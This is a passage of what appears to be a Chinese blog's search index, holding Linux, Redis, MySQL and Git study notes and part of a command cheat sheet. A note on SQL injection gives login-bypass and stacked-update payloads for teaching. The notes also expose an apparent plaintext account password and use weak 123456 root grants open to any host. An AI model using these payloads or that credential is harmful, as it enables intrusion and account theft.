获取当前用户信息</p>\n<p>Logout/exit – 登出当前用户</p>\n<p>w – 详细登录信息</p>\n<p>last – 历史登录信息</p>\n<h2 id=\"2-History-历史命令-c-清除历史\"><a href=\"#2-History-历史命令-c-清除历史\" class=\"headerlink\" title=\"(2) History - 历史命令 -c 清除历史\"></a>(2) History - 历史命令 -c 清除历史</h2><h2 id=\"3-Wget-通过网络获取文件\"><a href=\"#3-Wget-通过网络获取文件\" class=\"headerlink\" title=\"(3) Wget - 通过网络获取文件\"></a>(3) Wget - 通过网络获取文件</h2><p>-O 重命名下载的文件</p>\n<p>例如：wget <a href=\"https://www.python.org/ftp/python3.7.3/Python-3.7.3.tar.xz\">https://www.python.org/ftp/python/python3.7.3/Python-3.7.3.tar.xz</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz</span><br><span class=\"line\">tar -xvf Python-3.8.0a1.tgz</span><br></pre></td></tr></table></figure>\n\n<p> wget <a href=\"https://www.python.org/ftp/python3.7.3/Python-3.7.3.tar.xz\">https://www.python.org/ftp/python/python3.7.3/Python-3.7.3.tgz</a></p>\n<h2 id=\"4-Xz-z-压缩-d-解压缩\"><a href=\"#4-Xz-z-压缩-d-解压缩\" class=\"headerlink\" title=\"(4) Xz -z 压缩 -d 解压缩\"></a>(4) Xz -z 压缩 -d 解压缩</h2><h2 id=\"5-Tar-xvf解归档-cvf-创建归档文件\"><a href=\"#5-Tar-xvf解归档-cvf-创建归档文件\" class=\"headerlink\" title=\"(5) Tar -xvf解归档 -cvf 创建归档文件\"></a>(5) Tar -xvf解归档 -cvf 创建归档文件</h2><h2 id=\"6-Cat-n-添加行号-cat-n-taobao-html-more\"><a href=\"#6-Cat-n-添加行号-cat-n-taobao-html-more\" class=\"headerlink\" title=\"(6) Cat -n 添加行号 cat -n taobao.html | more\"></a>(6) Cat -n 添加行号 cat -n taobao.html | more</h2><h2 id=\"7-管道-将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）\"><a href=\"#7-管道-将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）\" class=\"headerlink\" title=\"(7)  | 管道 - 将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）\"></a>(7)  | 管道 - 将多个进程连接起来（把前一个命令的输出作为下一个命令的输入）</h2><h2 id=\"8-2-gt-错误输出重定向\"><a href=\"#8-2-gt-错误输出重定向\" class=\"headerlink\" title=\"(8) 2&gt; - 错误输出重定向\"></a>(8) 2&gt; - 错误输出重定向</h2><h2 id=\"9-2-gt-gt-错误追加输出重定向\"><a href=\"#9-2-gt-gt-错误追加输出重定向\" class=\"headerlink\" title=\"(9) 2&gt;&gt; - 错误追加输出重定向\"></a>(9) 2&gt;&gt; - 错误追加输出重定向</h2><h2 id=\"10-Nginx-Web服务器（HTTP服务器）-反向代理服务器\"><a href=\"#10-Nginx-Web服务器（HTTP服务器）-反向代理服务器\" class=\"headerlink\" title=\"(10) Nginx - Web服务器（HTTP服务器）/反向代理服务器\"></a>(10) Nginx - Web服务器（HTTP服务器）/反向代理服务器</h2><p>nginx 启用</p>\n<p>Nginx -s stop 停止</p>\n<h2 id=\"11-Yum-list-installed-grep-nginx-–-grep查询字符串\"><a href=\"#11-Yum-list-installed-grep-nginx-–-grep查询字符串\" class=\"headerlink\" title=\"(11) Yum list installed | grep nginx – grep查询字符串\"></a>(11) Yum list installed | grep nginx – grep查询字符串</h2><h2 id=\"12-Yum-y-–自动同意所有询问\"><a href=\"#12-Yum-y-–自动同意所有询问\" class=\"headerlink\" title=\"(12) Yum -y –自动同意所有询问\"></a>(12) Yum -y –自动同意所有询问</h2><h2 id=\"13-Gcc-–version-C语言编译器\"><a href=\"#13-Gcc-–version-C语言编译器\" class=\"headerlink\" title=\"(13) Gcc –version C语言编译器\"></a>(13) Gcc –version C语言编译器</h2><h2 id=\"14-源代码构建安装Python解释器\"><a href=\"#14-源代码构建安装Python解释器\" class=\"headerlink\" title=\"(14) 源代码构建安装Python解释器\"></a>(14) 源代码构建安装Python解释器</h2><p>下载: wget <a href=\"https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz\">https://www.python.org/ftp/python/3.8.0/Python-3.8.0a1.tgz</a></p>\n<p>解压缩和解归档：xz -d xxx.xz/tar -xvf xxx.tar</p>\n<p>补充依赖库：</p>\n<p>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</p>\n<p>进入Python源代码目录安装前准备工作：</p>\n<p>cd pythonxxx</p>\n<p>./configure –prefix=usr/local/python38 –enable-optimizations</p>\n<p>构建和安装：make &amp;&amp; make install</p>\n<p>注册PATH环境变量：</p>\n<p>Cd ~</p>\n<p>Vim .bash_profile</p>\n<p>PATH=…:/usr/local/python38/bin</p>\n<p>激活环境变量：source .bash_profile</p>\n<p>测试安装是否成功：python3 –version</p>\n<p>创建链接：</p>\n<p>- 硬链接：- ln /code/example01.py /root/xxx (给磁盘文件增加了新的引用，只要引用数不为0文件就不会消失)</p>\n<p>- 软链接：- ln -s /usr/local/python38/bin/python3 /usr/bin/python3（相当于windows系统下的快捷方式）</p>\n<h2 id=\"15-Ls-l长格式查看\"><a href=\"#15-Ls-l长格式查看\" class=\"headerlink\" title=\"(15) Ls -l长格式查看\"></a>(15) Ls -l长格式查看</h2><p>-rwxr-xr-x 当前文件r:可读w:可写x:可执行</p>\n<h2 id=\"16-VIM编辑模式：\"><a href=\"#16-VIM编辑模式：\" class=\"headerlink\" title=\"(16) VIM编辑模式：\"></a>(16) VIM编辑模式：</h2><p>I/a: 编辑</p>\n<p>Esc: 退出编辑–&gt;命令模式–&gt; :或/ 末行模式</p>\n<p>:q 退出</p>\n<p>:set nu 显示行号</p>\n<p>:set nonu 去掉行号</p>\n<p>:set ts=4 tab键占位数</p>\n<p>Shift+zz/:wq ： 保存退出</p>\n<p>:syntax on 高亮语法/颜色代码 off关掉</p>\n<p>:set ruler 显示光标所在位置 set noruler关闭</p>\n<p>命令模式下输入G移动光标到末尾，500G表示光标移动到第500行；gg - 移到开头</p>\n<p>上下左右移动光标：hjkl -左下右上（前面可以加数字）</p>\n<p>Ctrl+y/ctrl+e：移动一行</p>\n<p>Ctrl+f/ctrl+b：翻一页</p>\n<p>0/$：移到行首行尾</p>\n<p>W: 移到下一个单词</p>\n<p>dd: 光标所在行删除一行，100dd删除100行</p>\n<p>yy: 复制光标所在行，10yy从所在行复制10行</p>\n<p>P: 粘贴，5P粘贴5次</p>\n<p>U: 撤销 / ctrl+R恢复</p>\n<p>多文件操作：</p>\n<p>:ls 显示所有同时打开的文件</p>\n<p>:b 2 切换到第二个文件</p>\n<p>:vs 垂直分屏</p>\n<p>:sp 水平分屏</p>\n<p>Ctrl+ww 切换分屏</p>\n<p>:qa 退出所有分屏</p>\n<p>:wqa 保存退出</p>\n<p>Vim -d 文件1 文件2 - 打开多文件进行版本比较</p>\n<p>映射快捷键：</p>\n<p>- map <F2> gg9999dd 清空命令行</p>\n<p>- inoremap _main if <strong>name</strong>== ‘__main__’:</p>\n<h2 id=\"17-Alias-hao-’ls-laR’-把常用命令设置别名\"><a href=\"#17-Alias-hao-’ls-laR’-把常用命令设置别名\" class=\"headerlink\" title=\"(17) Alias hao=’ls -laR’ 把常用命令设置别名\"></a>(17) Alias hao=’ls -laR’ 把常用命令设置别名</h2><p>①   Unalias hao 取消别名</p>\n<h2 id=\"18-宏操作：\"><a href=\"#18-宏操作：\" class=\"headerlink\" title=\"(18) 宏操作：\"></a>(18) 宏操作：</h2><p>录制宏：qa (a是寄存器的名字) - recording</p>\n<p>结束录制：q</p>\n<p>播放宏：@a</p>\n<h2 id=\"19-查找和替换：\"><a href=\"#19-查找和替换：\" class=\"headerlink\" title=\"(19) 查找和替换：\"></a>(19) 查找和替换：</h2><p>查找 - ？或者/ - /idx - 支持正则</p>\n<p>N / n - 正向搜索/反向搜索</p>\n<p>替换 - :1,$s/idx/index/cgie</p>\n<p> - c - confirm - 确认</p>\n<p> - g - global - 全局(一行出现多出匹配全部找出)</p>\n<p> - i - ignore case - 忽略大小写</p>\n<p> - e - error - 忽略错误</p>\n<h2 id=\"20-查找命令：\"><a href=\"#20-查找命令：\" class=\"headerlink\" title=\"(20) 查找命令：\"></a>(20) 查找命令：</h2><p> - grep - 搜索字符串(支持正则表达式)</p>\n<p> - find - 搜索文件</p>\n<p>-name - 根据名字搜索 - find / -name “*.html”</p>\n<p>-size - 根据大小搜索 - -10M / +10M</p>\n<p>-type - 根据类型搜索 - d / f / l / s</p>\n<p>-atime - 最后访问时间</p>\n<p>-mtime - 最后修改时间 - find . -mtime 0</p>\n<p>-ctime - 创建时间</p>\n<h2 id=\"21-网络相关命令：\"><a href=\"#21-网络相关命令：\" class=\"headerlink\" title=\"(21) 网络相关命令：\"></a>(21) 网络相关命令：</h2><p>- ssh - 安全远程连接 - 例如：ssh <a href=\"mailto:root@xx.xxx.xxx.xx(云服务器公网ip)\">root@xx.xxx.xxx.xx(云服务器公网ip)</a></p>\n<p>- scp - 安全文件拷贝 - 例如：scp -r /root/code <a href=\"mailto:root@xx.xxx.xxx.xx:/root/code\">root@xx.xxx.xxx.xx:/root/code</a></p>\n<p>- sftp - 安全文件传输（file transfer protocol）- 例如：sftp <a href=\"mailto:root@xx.xxx.xxx.xx\">root@xx.xxx.xxx.xx</a></p>\n<p>-put - 上传</p>\n<p>-get - 下载</p>\n<p>-bye - 退出</p>\n<p>-help 查看帮助</p>\n<p>-lls 本地列出文件</p>\n<p>-ping - 检查网络可达性 - ICMP - Internet Control Management Protocol - 网络层</p>\n<p> - ttl - time to live</p>\n<p> - ping to death - DDoS - Distributed Deny of Service - 分布式拒绝服务攻击</p>\n<p>-ifconfig / ip</p>\n<p>- 127.0.0.1 - 回环地址 - localhost</p>\n<p>-netstat</p>\n<p>- netstat -nap | grep 进程或端口</p>\n<p>-p - process - 查看进程信息（进程编号和进程名字）</p>\n<p>- kill 进程号</p>\n<h2 id=\"22-nginx启动停止重启服务：\"><a href=\"#22-nginx启动停止重启服务：\" class=\"headerlink\" title=\"(22) nginx启动停止重启服务：\"></a>(22) nginx启动停止重启服务：</h2><p>Service nginx start</p>\n<p>Systemctl start nginx</p>\n<p>Systemctl stop nginx</p>\n<p>Systemctl restart nginx</p>\n<p>Systemctl status nginx</p>\n<p>Systemctl enable nginx - 开机自启</p>\n<p>Systemctl disable nginx</p>\n<h2 id=\"23-进程操作相关命令：\"><a href=\"#23-进程操作相关命令：\" class=\"headerlink\" title=\"(23) 进程操作相关命令：\"></a>(23) 进程操作相关命令：</h2><p>~命令+&amp; - 把命令放到后台运行</p>\n<p>Ctrl+z - 把前台命令停止并放到后台运行</p>\n<p>bg %编号 - 重新运行已停止的命令</p>\n<p>~ ps - processes - 例如：ps -ef | grep redis | grep -v grep 不显示grep信息</p>\n<p>~kill - 结束进程</p>\n<p>~jobs - 查看后台运行或停止的进程</p>\n<p>~fg - foreground - 将后台命令至于前台</p>\n<p>~bg - background - 让命令在后台运行 ctl+z</p>\n<p>~top - 任务管理器 q退出</p>\n<h2 id=\"24-centos7-命令行界面上下翻页\"><a href=\"#24-centos7-命令行界面上下翻页\" class=\"headerlink\" title=\"(24) centos7 命令行界面上下翻页:\"></a>(24) centos7 命令行界面上下翻页:</h2><p>shift + pageup 上翻</p>\n<p>shift + pagedown 下翻</p>\n<h2 id=\"25-Linux下命令行中的复制和粘贴\"><a href=\"#25-Linux下命令行中的复制和粘贴\" class=\"headerlink\" title=\"(25) Linux下命令行中的复制和粘贴:\"></a>(25) Linux下命令行中的复制和粘贴:</h2><p>安装gpm：yum install -y gpm*</p>\n<p>开启gpm服务：systemctl start gpm</p>\n<p>按住鼠标左键，选中想要复制的内容，松开就完成复制，再在复制的位置按右键就完成粘贴。</p>\n<h2 id=\"26-数据库：\"><a href=\"#26-数据库：\" class=\"headerlink\" title=\"(26) 数据库：\"></a>(26) 数据库：</h2><p>关系型数据库 - Oracle / MySQL / MariaDB - 二维表</p>\n<p>非关系型数据库 - MongoDB / Redis / ElasticSearch - 文档数据库/KV数据库</p>\n<p>Yum install -y mariadb mariadb-server</p>\n<p>Mysqld - MySQL Daemon - 守护进程 </p>\n<p>Rpm -ivh mysql-5.7.34-1.el7.x86_64.rpm</p>\n<p>Rpm -e 擦除</p>\n<p>Systemctl start mariadb - 启动mysql</p>\n<p>Mysql -u root -p - 连接mysql</p>\n<p>Use mysql</p>\n<p>修改mysql密码</p>\n<p>Update user set password=password(‘123456’) where user=’root’;</p>\n<p>Flush privileges;</p>\n<p>10.4版本以后：</p>\n<p>select user, password, host from user; # 查询已有用户</p>\n<p>SET PASSWORD FOR ‘bob‘@’%.loc.gov’ = PASSWORD(‘newpass’); # 根据用户及host修改密码</p>\n<p>SET PASSWORD FOR ‘bob‘@localhost = PASSWORD(“”); # # 根据用户及host删除密码</p>\n<p>delete from user where user=’XXX’ and host=’localhost’; ## 指定域及用户删除用户</p>\n<p>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION; 创建一个用户能使用root从任何主机连接到mysql服务器。</p>\n<p>—Redis数据库：</p>\n<p><a href=\"https://redis.io/\">https://redis.io</a></p>\n<p><a href=\"https://redisdoc.com/\">https://redisdoc.com</a> 使用手册</p>\n<p>下载Radis:</p>\n<p>Wget <a href=\"https://download.redis.io/releases/redis-6.2.2.tar.gz?_ga=2.183820325.200813573.1619352920-1877153441.1619352920\">https://download.redis.io/releases/redis-6.2.2.tar.gz?_ga=2.183820325.200813573.1619352920-1877153441.1619352920</a></p>\n<p>解压缩解归档</p>\n<p>安装：make &amp;&amp; make install</p>\n<p>redis:编译时报错 /bin/sh: cc: command not found：</p>\n<p>补依赖项：yum -y install gcc gcc-c++ libstdc++-devel</p>\n<p>【Redis】编译错误zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory：</p>\n<p>–make MALLOC=libc</p>\n<p>–redis-server –version - 查看是否安装成功</p>\n<p>–redis-sever &amp; - 启动redis服务(&amp;表示后台运行)</p>\n<p>–netstat -nap | grep 6379或 ps -ef | grep redis | grep -v grep 或 jobs - 查看redis服务启动是否成功</p>\n<p>–redis-server –requirepass 123456 &amp; - 带密码启动</p>\n<p>–redis-cli - 客户端访问 - auth 123456 - 输密码</p>\n<p>–redis-cli – 关闭redis</p>\n<p>–shutdown</p>\n<h2 id=\"27-安装和使用Git\"><a href=\"#27-安装和使用Git\" class=\"headerlink\" title=\"(27) 安装和使用Git:\"></a>(27) 安装和使用Git:</h2><p>​    Git官网：<a href=\"http://git-scm.com/\">http://git-scm.com/</a></p>\n<p>点击Tarballs，右击选择复制所需文件的下载链接地址</p>\n<p>Wget + 链接地址</p>\n<p>解压缩： xz -d xxx.tar.xz</p>\n<p>解归档：tar -xvf xxx.tar</p>\n<p>安装依赖项：yum install libcurl-devel； yum install zlib-devel</p>\n<p>安装GIT: ./configure –prefix=/usr/local/</p>\n<p> Make $$ make install</p>\n<p> Git –version</p>\n<p>版本控制：</p>\n<p>1990s - CVS / VSS - 锁定模式</p>\n<p>2000 - Subversion(SVN) - 合并模式</p>\n<p>必须有版本控制的中央服务器才能使用版本控制 - 中央集权型的版本控制系统</p>\n<p>分布式版本控制系统 - 2005 - Git</p>\n<p>Git / Mercury</p>\n<p>—Git命令：</p>\n<p>Git init - 将文件夹初始化为Git仓库</p>\n<p>Git add xxxx - 添加文件到git仓库</p>\n<p>Git status - 查看添加状态</p>\n<p>Git add . - 添加当前目录所有文件</p>\n<p>Git commit -m ‘提交说明’ - 提交命令</p>\n<p>按提示设置账户默认ID</p>\n<p>Git log - 查看日志</p>\n<p>若使用 rm -f *误删除：git checkout – . 恢复所有文件</p>\n<p>或使用 git log 查看commit一栏前6位作为ID</p>\n<p>Git reset –hard <ID> - 回到指定版本</p>\n<p>git reset –hard HEAD^ - 回到上一版本</p>\n<p>Git reflog 查看已修改过版本</p>\n<p>—国内代码托管平台：gitee /coding</p>\n<p><a href=\"https://gitee.com/\">https://gitee.com</a> – account: <a href=\"mailto:1174185292@qq.com\">1174185292@qq.com</a> Z110112WILOVEME</p>\n<p><a href=\"https://coding.net/\">https://coding.net</a></p>\n<p>Git clone <a href=\"https://gitee.com/zwzwzw001/python001.git\">https://gitee.com/zwzwzw001/python001.git</a> - 从网站克隆到本地</p>\n<p>-git push - 将本地代码推到服务器</p>\n<p>=git pull - 将服务器更新同步到本地</p>\n<h2 id=\"28-centos不小心删除-root目录该如何解决\"><a href=\"#28-centos不小心删除-root目录该如何解决\" class=\"headerlink\" title=\"(28) centos不小心删除/root目录该如何解决?\"></a>(28) centos不小心删除/root目录该如何解决?</h2><p>1.直接创建/root目录；mkdir /root</p>\n<p>2.复制/etc/skel/下的隐藏文件到/root目录下；cp /etc/skel/.bash* /root</p>\n<p>3.重启即可</p>\n<h2 id=\"29-数据库-数据的仓库-database-实现数据持久化和数据管理\"><a href=\"#29-数据库-数据的仓库-database-实现数据持久化和数据管理\" class=\"headerlink\" title=\"(29) 数据库 - 数据的仓库 - database - 实现数据持久化和数据管理\"></a>(29) 数据库 - 数据的仓库 - database - 实现数据持久化和数据管理</h2><p>持久化 - 将数据从内存转移到能够长久保存数据的存储介质的过程</p>\n<p>保证数据的完整性和一致性</p>\n<p>完整性：</p>\n<p>\\1. 实体完整性 - 每一个实体都是独一无二的，没有冗余 - 主键/唯一索引</p>\n<p>\\2. 参照完整性 - 外键</p>\n<p>\\3. 域完整性 - 录入的数据都是有效的数据 - 数据类型/数据长度/非空约束/默认值约束/检查约束</p>\n<p>Alter table tb_score add constraint ck_score_scmark check (scmark between 0 and 100);</p>\n<p>一致性：事务 - 要么全成功要么全失败，操作不可分割 - ACID特性</p>\n<p>\\1. A - Atomicity - 原子性 - 不可分割</p>\n<p>\\2. C - Consistency - 一致性 - 事务前后数据状态要一致</p>\n<p>\\3. I - Isolation - 隔离性 - 并发的多个事务不知道彼此的中间状态</p>\n<p>\\4. D - Duration - 持久性 - 事务完成后数据要做持久化</p>\n<p>分类：关系型数据库(SQL)和非关系型数据库(NoSQL)</p>\n<p>- 文档数据库 - MongoDB / ElasticSearch</p>\n<p>- 键值对数据库 - Redis - 内存 - 单线程+异步I/O （多路I/O复用）</p>\n<p>- 列族数据库</p>\n<p>- 图数据库</p>\n<p>计算密集型应用 - 多进程 + 多线程</p>\n<p>I/O密集型应用 - 单线程 + 异步I/O (协程（微线程）)</p>\n<p>2008年 - LLOOGG - log(日志)</p>\n<p>MySQL - Redis - REmote DIctionary Server</p>\n<p>Github / Twitter / Sina / </p>\n<p>冷数据（不经常使用）/ 热数据（经常使用）</p>\n<p>\\1. 高速缓存服务（用户经常访问的数据从数据库搬到内存）</p>\n<p>\\2. 实时排行榜</p>\n<p>\\3. 投票点赞</p>\n<p>\\4. 消息队列</p>\n<p>Yum install redis</p>\n<p>源代码构建安装 make &amp;&amp; make install</p>\n<p>Redis-server –port 1234 –requirepass 123456 –appendonly yes</p>\n<p>Redis-server –requirepass 123456 &gt; redis.log&amp;</p>\n<p>Redis-server 配置文件(redis.conf) &gt; redis.log &amp;</p>\n<p>启动Redis客户端：</p>\n<p>Redis-cli -h 主机IP地址 -p 端口（默认6379）</p>\n<p>主机：端口&gt;auth 密码</p>\n<p>主机：端口&gt;ping</p>\n<p>&gt;keys *</p>\n<p>&gt;type </p>\n<p>Redis 命令参考 - <a href=\"http://redisdoc.com/\">http://redisdoc.com/</a></p>\n<p>哈希存储 - 性能非常好的存储方案 – set(集合)</p>\n<p>Obj — 哈希函数 —&gt; 哈希码（散列码） —&gt; 对象在内存中存储的位置</p>\n<p>文件 —&gt; MD5 / SHA1 / SHA256 —&gt; 哈希码（数字指纹/签名）</p>\n<p>哈希表</p>\n<p>hmset stu1 id 1001 name xxx sex male te1 11323232xxx</p>\n<p>Hget stu1 name</p>\n<p>Hmget stu1 name sex tel</p>\n<p>Hvals stu1</p>\n<p>Hgetall stu1</p>\n<p>Hdel stu1 tel </p>\n<p>- Redis主从复制读写分离</p>\n<p>Redis-server –slaveof [主ip] 6379 –masterauth 123456 &gt; redis.log &amp;</p>\n<p>info replication # 查看主从复制信息exitexit</p>\n<p>Slaveof no one</p>\n<p>-Redis修复持久化文件的工具</p>\n<p>-dump.rdb文件误删解决方法</p>\n<p>redis-server –requirepass 123456 –appendonly yes &gt; redis.log &amp; # 生成.aof文件的保存方式</p>\n<p>Redis-check-aof –fix appendonly.aof</p>\n<p>Redis-check-rdb –fix dump.rdb</p>\n<p>Tornado / Node.js</p>\n<p>文件系统 / 层次数据库 / 网状数据库</p>\n<p>- 关系型数据库：</p>\n<p>- 理论基础：关系代数和集合论</p>\n<p>-具体表象：用二维表来保存数据 - 学生表</p>\n<p>=行：一条记录 - 一个学生的信息</p>\n<p>-列：一个字段 - 学生的属性</p>\n<p>-主键列：能够唯一标识一条记录的列，如学号</p>\n<p>-编程语言：SQL - 结构化查询语言</p>\n<p>- DDL - 数据定义语言 - create / drop / alter</p>\n<p>- create database xxx default charset utf8mb4; - 创建名为xxx的数据库</p>\n<p>- use school;</p>\n<p>- show tables;</p>\n<p>- create user ‘root’@’%’ identified by ‘123456’; 添加访问权限</p>\n<p>- flush privileges</p>\n<p>- grant all privileges on <em>.</em> to ‘root’@’%’ with grant option; 允许所有客户端连接</p>\n<p>- flush privileges</p>\n<p>- drop database if exists xxx - 删除xxx数据库</p>\n<p>- ？ data types - 查看数据类型</p>\n<p>- ？ int - int类型描述</p>\n<p>- DML - 数据操作语言 - insert / delete / update / select</p>\n<p>- DCL - 数据控制语言 - grant / revoke</p>\n<p>-产品：Oracle - 甲骨文</p>\n<p>IBM DB2</p>\n<p>Microsoft SQLServer</p>\n<p>Sybase</p>\n<p>MySQL</p>\n<p>PostgreSQL</p>\n<p>SQLite</p>\n<p>学生（学号、姓名、性别、生日、家庭住址）</p>\n<p>学院（编号、名称、网址、。。。。）</p>\n<p>插入不少于3条学院记录</p>\n<p>实体：学生、学院</p>\n<p>关系：属于</p>\n<p>重数：多对一</p>\n<p>– 一对一重数关系</p>\n<p>create table tb_person</p>\n<p>(</p>\n<p>pid int auto_increment,</p>\n<p>pname varchar(50),</p>\n<p>primary key (pid)</p>\n<p>);</p>\n<p>create table tb_idcard</p>\n<p>(</p>\n<p>cid int auto_increment,</p>\n<p>cno char(18) not null,</p>\n<p>ps varchar(255) not null,</p>\n<p>expire date not null,</p>\n<p>pid int not null,</p>\n<p>PRIMARY key (cid)</p>\n<p>);</p>\n<p>alter table tb_idcard add CONSTRAINT fk_card_pid foreign key (pid) REFERENCES tb_person (pid);</p>\n<p>– 一对一是多对一的特例，加上唯一性约束</p>\n<p>alter table tb_idcard add CONSTRAINT uni_card_pid unique (pid);</p>\n<p>–SQL注射攻击：</p>\n<p>tb_user</p>\n<p>Userid    username     userpass …</p>\n<p>1          admin        123456</p>\n<p>select * from tb_user where username=’%s’ and password=’%s’</p>\n<p>Username=admin</p>\n<p>Password=’x’ or ‘1’=’1’</p>\n<p>‘; update … where ‘1’ = ‘1’</p>\n<p>select * from tb_user where username=’admin’ and password=’x’ or ‘1’=’1’</p>\n<p>select * from tb_user where username=’admin’ and password=’‘; update … where ‘1’ = ‘1’</p>\n<p># 向表中添加数据应避免用字符串拼接，防止SQL注射攻击。</p>\n<h1 id=\"—-防火墙\"><a href=\"#—-防火墙\" class=\"headerlink\" title=\"— 防火墙\"></a>— 防火墙</h1><p>开启：systemctl start firewalld</p>\n<p>添加80端口：firewall-cmd –add-port=80/tcp –permanent</p>\n<p>重启：systemctl restart firewalld</p>\n<p>firewalld和iptables</p>\n<p>If you haven’t any real data in your database then clear all in /var/lib/mysql.</p>\n<p>After that try again to run command mysql_install_db –user=mysql –basedir=/usr –datadir=/var/lib/mysql to initialize database directory.</p>\n","categories":["linux"],"tags":["基础"]},{"title":"linux常用命令大全","url":"/2022/08/17/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/","content":"<h2 id=\"系统信息\"><a href=\"#系统信息\" class=\"headerlink\" title=\"/系统信息\"></a>/系统信息</h2><p>arch 显示机器的处理器架构</p>\n<p>uname -m 显示机器的处理器架构</p>\n<p>uname -r 显示正在使用的内核版本</p>\n<p>dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) </p>\n<p>hdparm -i /dev/hda 罗列一个磁盘的架构特性 </p>\n<p>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 </p>\n<p>cat /proc/cpuinfo 显示CPU info的信息</p>\n<p>cat /proc/interrupts 显示中断 </p>\n<p>cat /proc/meminfo 校验内存使用 </p>\n<p>cat /proc/swaps 显示哪些swap被使用</p>\n<p>cat /proc/version 显示内核的版本 </p>\n<p>cat /proc/net/dev 显示网络适配器及统计 </p>\n<p>cat /proc/mounts 显示已加载的文件系统 </p>\n<p>lspci -tv 罗列 PCI 设备 </p>\n<p>lsusb -tv 显示 USB 设备 </p>\n<p>date 显示系统日期</p>\n<p>cal 2007 显示2007年的日历表 </p>\n<p>date 041217002007.00 设置日期和时间 - 月日时分年.秒 </p>\n<p>clock -w 将时间修改保存到 BIOS </p>\n<h1 id=\"关机-系统的关机、重启以及登出\"><a href=\"#关机-系统的关机、重启以及登出\" class=\"headerlink\" title=\"关机 (系统的关机、重启以及登出 )\"></a>关机 (系统的关机、重启以及登出 )</h1><p>shutdown -h now 关闭系统</p>\n<p>init 0 关闭系统</p>\n<p>telinit 0 关闭系统</p>\n<p>shutdown -h hours:minutes &amp; 按预定时间关闭系统 </p>\n<p>shutdown -c 取消按预定时间关闭系统</p>\n<p>shutdown -r now 重启</p>\n<p>reboot 重启</p>\n<p>logout 注销</p>\n<h1 id=\"文件和目录\"><a href=\"#文件和目录\" class=\"headerlink\" title=\"文件和目录\"></a>文件和目录</h1><p>cd /home 进入 ‘/ home’ 目录’ </p>\n<p>cd .. 返回上一级目录</p>\n<p>cd ../.. 返回上两级目录</p>\n<p>cd 进入个人的主目录</p>\n<p>cd ~user1 进入个人的主目录</p>\n<p>cd - 返回上次所在的目录</p>\n<p>pwd 显示工作路径</p>\n<p>ls 查看目录中的文件</p>\n<p>ls -F 查看目录中的文件</p>\n<p>ls -l 显示文件和目录的详细资料</p>\n<p>ls -a 显示隐藏文件</p>\n<p>ls <em>[0-9]</em> 显示包含数字的文件名和目录名</p>\n<p>tree 显示文件和目录由根目录开始的树形结构</p>\n<p>lstree 显示文件和目录由根目录开始的树形结构</p>\n<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’ </p>\n<p>mkdir dir1 dir2 同时创建两个目录 </p>\n<p>mkdir -p /tmp/dir1/dir2 创建一个目录树 </p>\n<p>rm -f file1 删除一个叫做 ‘file1’ 的文件’ </p>\n<p>rmdir dir1 删除一个叫做 ‘dir1’ 的目录’ </p>\n<p>rm -rf dir1 删除一个叫做 ‘dir1’ 的目录并同时删除其内容</p>\n<p>rm -rf dir1 dir2 同时删除两个目录及它们的内容 </p>\n<p>mv dir1 new_dir 重命名/移动 一个目录 </p>\n<p>cp file1 file2 复制一个文件 </p>\n<p>cp dir/* . 复制一个目录下的所有文件到当前工作目录</p>\n<p>cp -a /tmp/dir1 . 复制一个目录到当前工作目录 </p>\n<p>cp -a dir1 dir2 复制一个目录 </p>\n<p>cp -r dir1 dir2 复制一个目录及子目录</p>\n<p>ln -s file1 lnk1 创建一个指向文件或目录的软链接 </p>\n<p>ln file1 lnk1 创建一个指向文件或目录的物理链接 </p>\n<p>touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) </p>\n<p>file file1 outputs the mime type of the file as text </p>\n<p>iconv -l 列出已知的编码</p>\n<p>iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding. </p>\n<p>find . -maxdepth 1 -name *.jpg -print -exec convert “{}” -resize 80x60 “thumbs/{}” ; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick) </p>\n<h1 id=\"文件搜索\"><a href=\"#文件搜索\" class=\"headerlink\" title=\"文件搜索\"></a>文件搜索</h1><p>find / -name file1 从 ‘/‘ 开始进入根文件系统搜索文件和目录</p>\n<p>find / -user user1 搜索属于用户 ‘user1’ 的文件和目录 </p>\n<p>find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件</p>\n<p>find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件</p>\n<p>find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件</p>\n<p>find / -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限 </p>\n<p>find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备</p>\n<p>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令 </p>\n<p>whereis halt 显示一个二进制文件、源码或man的位置 </p>\n<p>which halt 显示一个二进制文件或可执行文件的完整路径</p>\n<h1 id=\"挂载一个文件系统\"><a href=\"#挂载一个文件系统\" class=\"headerlink\" title=\"挂载一个文件系统\"></a>挂载一个文件系统</h1><p>mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 ‘/ mnt/hda2’ 已经存在 </p>\n<p>umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 ‘/ mnt/hda2’ 退出 </p>\n<p>fuser -km /mnt/hda2 当设备繁忙时强制卸载 </p>\n<p>umount -n /mnt/hda2 